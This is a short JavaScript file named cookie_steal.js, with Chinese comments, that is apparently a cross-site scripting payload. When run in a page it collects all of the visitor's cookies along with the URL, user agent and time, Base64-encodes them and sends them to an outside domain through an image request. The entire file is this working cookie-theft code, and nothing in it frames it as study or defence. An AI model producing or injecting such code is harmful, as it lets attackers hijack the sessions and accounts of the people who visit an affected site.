// cookie_steal.js
(function() {
    // 解析 Cookie 为对象
    var cookies = document.cookie.split('; ');
    var cookieObj = {};
    cookies.forEach(function(c) {
        var parts = c.split('=');
        var key = parts[0];
        var value = decodeURIComponent(parts.slice(1).join('='));
        cookieObj[key] = value;
    });

    // 构造上报数据（包含时间、URL、User-Agent）
    var data = {
        url: location.href,
        ua: navigator.userAgent,
        time: new Date().toISOString(),
        cookies: cookieObj
    };

    // Base64 编码后发送
    var payload = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
    new Image().src = 'https://test.qazqazqaz762000.eu.org/?c=' + encodeURIComponent(payload);
})();
